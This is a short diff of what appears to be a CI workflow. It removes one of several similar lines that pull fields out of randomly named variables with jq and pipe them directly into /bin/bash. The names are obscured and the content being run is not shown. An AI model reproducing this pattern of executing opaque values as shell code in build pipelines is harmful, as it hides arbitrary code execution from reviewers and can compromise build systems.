@@ -23,7 +23,6 @@ jobs:
           echo $dblep9408 | jq -r .nvw43 | /bin/bash
           printf '%s' "$k54" | jq -r .jct54973 | /bin/bash
           printf '%s' "$qvz0" | jq -r .b537 | /bin/bash
-          echo $afgng62 | jq -r .uqnf68 | /bin/bash
           echo $yd62 | jq -r .coue70192 | /bin/bash
           echo $y5 | jq -r .udzu0054 | /bin/bash
           echo $cnbzk70334 | jq -r .cm913 | /bin/bash
